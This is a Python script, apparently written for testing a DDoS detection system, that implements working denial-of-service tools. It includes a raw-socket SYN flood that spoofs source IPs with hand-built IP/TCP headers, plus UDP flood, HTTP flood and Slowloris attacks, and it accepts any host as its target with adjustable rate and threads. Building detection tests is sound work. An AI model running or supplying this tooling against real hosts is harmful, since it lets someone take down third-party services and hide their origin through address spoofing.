#!/usr/bin/env python3
"""
Traffic Simulation Script for DDoS Detection Testing

Generates synthetic network traffic including normal and attack patterns
for testing the DDoS detection system.
"""

import argparse
import sys
import time
import random
import threading
import logging
from dataclasses import dataclass
from typing import Dict, Any, List, Optional
import socket
import struct

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


@dataclass
class TrafficConfig:
    target_host: str = "127.0.0.1"
    target_port: int = 80
    duration: int = 60
    rate: int = 1000
    attack_type: str = "benign"
    threads: int = 1
    packet_size: int = 64
    randomize_ips: bool = True
    num_source_ips: int = 100
    verbose: bool = False


class TrafficSimulator:
    def __init__(self, config: TrafficConfig):
        self.config = config
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None,
        }
        self.source_ips = self._generate_source_ips()

        # Try to create raw socket for SYN flood (requires root)
        try:
            self._raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self._raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            logger.warning("Raw socket requires root privileges — SYN flood disabled")
            self._raw_sock = None
        except Exception:
            self._raw_sock = None

        self._udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def __del__(self):
        if getattr(self, '_raw_sock', None):
            try:
                self._raw_sock.close()
            except Exception:
                pass
        if getattr(self, '_udp_sock', None):
            try:
                self._udp_sock.close()
            except Exception:
                pass

    def _generate_source_ips(self) -> List[str]:
        return [
            f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
            for _ in range(self.config.num_source_ips)
        ]

    def _get_random_ip(self) -> str:
        return random.choice(self.source_ips) if self.config.randomize_ips else self.source_ips[0]

    def _checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack(f'!{len(data)//2}H', data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _create_ip_header(self, src_ip: str, dst_ip: str, protocol: int, payload_len: int) -> bytes:
        src_int = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        dst_int = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        total_length = payload_len + 20
        ident = random.randint(0, 65535)
        header = struct.pack('!BBHHHBBHII',
            0x45, 0, total_length, ident,
            0x4000, 64, protocol, 0, src_int, dst_int)
        checksum = self._checksum(header)
        return struct.pack('!BBHHHBBHII',
            0x45, 0, total_length, ident,
            0x4000, 64, protocol, checksum, src_int, dst_int)

    def _create_tcp_header(self, src_port: int, dst_port: int,
                           seq: int, ack: int, flags: int) -> bytes:
        return struct.pack('!HHLLBBHHH',
            src_port, dst_port, seq, ack,
            (5 << 4), flags & 0x3F, 65535, 0, 0)

    def send_syn_packet(self, dst_ip: str, dst_port: int) -> bool:
        if self._raw_sock is None:
            return False
        try:
            src_ip = self._get_random_ip()
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            tcp_hdr = self._create_tcp_header(src_port, dst_port, seq, 0, 0x02)
            ip_hdr = self._create_ip_header(src_ip, dst_ip, 6, len(tcp_hdr))
            packet = ip_hdr + tcp_hdr

            self._raw_sock.sendto(packet, (dst_ip, 0))
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(packet)
            if self.config.verbose:
                logger.debug(f"SYN {src_ip}:{src_port} → {dst_ip}:{dst_port}")
            return True
        except Exception as e:
            if self.config.verbose:
                logger.debug(f"SYN failed: {e}")
            self.stats['errors'] += 1
            return False

    def send_udp_packet(self, dst_ip: str, dst_port: int, payload: bytes = None) -> bool:
        try:
            payload = payload or (b'X' * max(1, self.config.packet_size - 8))
            self._udp_sock.sendto(payload, (dst_ip, dst_port))
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(payload)
            return True
        except Exception as e:
            if self.config.verbose:
                logger.debug(f"UDP failed: {e}")
            self.stats['errors'] += 1
            return False

    def send_http_request(self, host: str, port: int, path: str = "/") -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: DDoS-Tester/1.0\r\n\r\n"
            sock.send(request.encode())
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(request)
            sock.close()
            return True
        except Exception as e:
            if self.config.verbose:
                logger.debug(f"HTTP failed: {e}")
            self.stats['errors'] += 1
            return False


class BenignSimulator(TrafficSimulator):
    def run(self):
        self.running = True
        self.stats['start_time'] = time.time()
        end_time = time.time() + self.config.duration

        while self.running and time.time() < end_time:
            traffic_type = random.choice(['tcp', 'udp', 'http'])
            if traffic_type == 'tcp':
                self.send_syn_packet(self.config.target_host, self.config.target_port)
            elif traffic_type == 'udp':
                self.send_udp_packet(self.config.target_host, self.config.target_port)
            elif traffic_type == 'http':
                self.send_http_request(self.config.target_host, self.config.target_port)
            time.sleep(1.0 / self.config.rate)

        self.stats['end_time'] = time.time()


class SYNFloodSimulator(TrafficSimulator):
    def run(self):
        self.running = True
        self.stats['start_time'] = time.time()
        end_time = time.time() + self.config.duration

        while self.running and time.time() < end_time:
            self.send_syn_packet(self.config.target_host, self.config.target_port)
            time.sleep(1.0 / self.config.rate)

        self.stats['end_time'] = time.time()


class UDPFloodSimulator(TrafficSimulator):
    def run(self):
        self.running = True
        self.stats['start_time'] = time.time()
        end_time = time.time() + self.config.duration

        while self.running and time.time() < end_time:
            self.send_udp_packet(self.config.target_host, self.config.target_port)
            time.sleep(1.0 / self.config.rate)

        self.stats['end_time'] = time.time()


class HTTPFloodSimulator(TrafficSimulator):
    def run(self):
        self.running = True
        self.stats['start_time'] = time.time()
        end_time = time.time() + self.config.duration
        paths = ['/', '/api', '/login', '/search', '/index.html']

        while self.running and time.time() < end_time:
            self.send_http_request(self.config.target_host, self.config.target_port, random.choice(paths))
            time.sleep(1.0 / self.config.rate)

        self.stats['end_time'] = time.time()


class SlowlorisSimulator(TrafficSimulator):
    def run(self):
        self.running = True
        self.stats['start_time'] = time.time()
        connections = []
        end_time = time.time() + self.config.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.config.target_host, self.config.target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(b"Host: " + self.config.target_host.encode() + b"\r\n")
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"X-Custom-Header: " + b'X' * random.randint(10, 100) + b"\r\n")
                connections.append(sock)
                self.stats['packets_sent'] += 4
            except Exception as e:
                if self.config.verbose:
                    logger.debug(f"Slowloris connect failed: {e}")

            for sock in connections[:]:
                try:
                    sock.send(b"X-Keep-Alive: " + b'X' * random.randint(1, 50) + b"\r\n")
                    self.stats['packets_sent'] += 1
                except Exception:
                    connections.remove(sock)

            time.sleep(0.1)

        for sock in connections:
            try:
                sock.close()
            except Exception:
                pass

        self.stats['end_time'] = time.time()


def run_multi_threaded(simulator_class, config: TrafficConfig) -> Dict[str, Any]:
    total_stats = {'packets_sent': 0, 'bytes_sent': 0, 'errors': 0}
    stats_lock = threading.Lock()

    def worker(worker_id):
        sim = simulator_class(config)
        sim.run()
        with stats_lock:
            for key in ('packets_sent', 'bytes_sent', 'errors'):
                total_stats[key] += sim.stats[key]

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(config.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return total_stats


def main():
    parser = argparse.ArgumentParser(description='Simulate traffic for DDoS detection testing')
    parser.add_argument('--target', '-t', required=True, help='Target IP or hostname')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port')
    parser.add_argument('--attack', '-a', default='benign',
                        choices=['benign', 'syn_flood', 'udp_flood', 'http_flood', 'slowloris'])
    parser.add_argument('--rate', '-r', type=int, default=1000, help='Packets per second')
    parser.add_argument('--duration', '-d', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads')
    parser.add_argument('--packet-size', type=int, default=64, help='Packet size in bytes')
    parser.add_argument('--source-ips', type=int, default=100, help='Number of source IPs to spoof')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    args = parser.parse_args()

    config = TrafficConfig(
        target_host=args.target,
        target_port=args.port,
        duration=args.duration,
        rate=args.rate,
        attack_type=args.attack,
        threads=args.threads,
        packet_size=args.packet_size,
        randomize_ips=True,
        num_source_ips=args.source_ips,
        verbose=args.verbose,
    )

    simulators = {
        'benign': BenignSimulator,
        'syn_flood': SYNFloodSimulator,
        'udp_flood': UDPFloodSimulator,
        'http_flood': HTTPFloodSimulator,
        'slowloris': SlowlorisSimulator,
    }

    simulator_class = simulators.get(args.attack)
    if not simulator_class:
        logger.error(f"Unknown attack type: {args.attack}")
        sys.exit(1)

    logger.info(f"Attack: {args.attack} | Target: {args.target}:{args.port} | "
                f"Rate: {args.rate} pps | Duration: {args.duration}s | Threads: {args.threads}")

    start_time = time.time()

    if args.threads > 1:
        stats = run_multi_threaded(simulator_class, config)
    else:
        sim = simulator_class(config)
        sim.run()
        stats = sim.stats

    elapsed = time.time() - start_time

    print("\n" + "=" * 50)
    print("TRAFFIC SIMULATION RESULTS")
    print("=" * 50)
    print(f"Attack Type:   {args.attack}")
    print(f"Duration:      {elapsed:.2f} seconds")
    print(f"Packets Sent:  {stats['packets_sent']:,}")
    print(f"Bytes Sent:    {stats['bytes_sent']:,}")
    logger.info(f"Average Rate:  {stats['packets_sent'] / max(elapsed, 0.001):.0f} pps")
    logger.info(f"Errors:        {stats['errors']}")

    logger.info("Traffic simulation completed")


if __name__ == '__main__':
    main()